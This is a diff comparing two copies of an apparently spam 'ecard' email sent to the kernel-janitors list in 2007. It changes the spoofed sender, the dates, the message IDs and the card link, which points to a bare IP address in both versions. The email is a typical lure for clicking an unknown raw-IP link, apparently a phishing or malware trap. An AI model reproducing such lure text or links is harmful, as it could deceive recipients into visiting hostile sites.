@@ -1,8 +1,10 @@
-From: "greetingCard.Org" <fjysq@emerytelcom.net>
-Date: Sat, 14 Jul 2007 16:33:11 +0000
+From: "greetingCard.Org" <fjysq@ev1.net>
+Date: Fri, 20 Jul 2007 20:51:14 +0000
 Subject: [KJ] You've received an ecard from a Partner!
-Message-Id: <001901c7c634$ab436bf0$bfbe4abd@snby.av>
+Message-Id: <001901c7cb0f$b6358fe0$bfbe4abd@rjs.bywav>
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <001901c7c634$ab436bf0$bfbe4abd@snby.av>
+In-Reply-To: <001901c7c634$ab436bf0$bfbe4abd@snby.av>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -16,7 +18,7 @@ SEEING YOUR CARD
 If your email software creates links to Web pages, click on your 
 card's direct www address below while you are connected to the Internet:
 
-http://86.106.44.60/?1c83715e8517a32e6b9ea
+http://68.93.81.99/?1c83715e8517a32e6b9ea
 
 Or copy and paste it into your browser's "Location" box (where Internet 
 addresses go).
